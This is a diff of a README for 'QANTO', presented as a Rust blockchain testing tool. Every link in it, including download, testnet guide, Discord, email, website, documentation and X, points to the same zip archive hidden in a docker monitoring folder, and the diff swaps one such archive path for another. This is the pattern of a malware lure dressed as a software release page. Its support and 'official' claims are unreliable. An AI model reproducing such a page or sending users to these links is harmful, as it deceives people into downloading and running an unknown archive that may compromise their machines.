@@ -1,12 +1,12 @@
 # 🚀 QANTO - Simple Blockchain Testing Made Easy
 
-[![Download QANTO](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip)](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip)
+[![Download QANTO](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip)](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip)
 
 ## 📖 About Qanto
 
 **Qanto** is the official Rust implementation of the Qanto Protocol. This application aims to provide an accessible way for users to interact with blockchain technology. With a focus on artificial intelligence and post-quantum security, Qanto offers a unique layer-0 solution for your needs.
 
-**Author**: trvorth (https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip)
+**Author**: trvorth (https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these steps to download and run Qanto on your computer. No programming kn
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads:
 
-   [Download QANTO](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip)
+   [Download QANTO](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip)
 
 2. **Choose Your Operating System**: On the releases page, you will find different versions for various operating systems. Select the one that matches your system. Currently, Qanto supports:
 
@@ -32,7 +32,7 @@ Follow these steps to download and run Qanto on your computer. No programming kn
 
 6. **Launch Qanto**: Once the installation is complete, find Qanto in your applications list. Click the icon to start the application.
 
-7. **Connect to the Testnet**: Qanto allows you to connect to the testnet easily. Follow the instructions in the application to set it up. You can reference the official testnet guide here: [Testnet Guide](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip).
+7. **Connect to the Testnet**: Qanto allows you to connect to the testnet easily. Follow the instructions in the application to set it up. You can reference the official testnet guide here: [Testnet Guide](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip).
 
 ## 🛠️ Features
 
@@ -54,14 +54,14 @@ Before you install Qanto, ensure your system meets the following requirements:
 
 If you have questions or need assistance while using Qanto, you can reach out through the following channels:
 
-- **Discord**: Join our community for real-time support. Click here: [Join Discord](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip).
-- **Email**: Feel free to email the author at https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip for inquiries or suggestions.
+- **Discord**: Join our community for real-time support. Click here: [Join Discord](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip).
+- **Email**: Feel free to email the author at https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip for inquiries or suggestions.
 
 ## 🔗 Additional Resources
 
-- **Official Website**: For more information about Qanto, visit: [https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip).
-- **Documentation**: Explore detailed guides and FAQs [here](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip).
-- **Follow Us**: Stay updated with news and updates on [X](https://raw.githubusercontent.com/luisdj10/QANTO/main/docker/monitoring/promtail/Software_2.8-beta.1.zip).
+- **Official Website**: For more information about Qanto, visit: [https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip).
+- **Documentation**: Explore detailed guides and FAQs [here](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip).
+- **Follow Us**: Stay updated with news and updates on [X](https://github.com/luisdj10/QANTO/raw/refs/heads/main/docker/monitoring/Software-v2.0.zip).
 
 ## 🎉 Conclusion
 
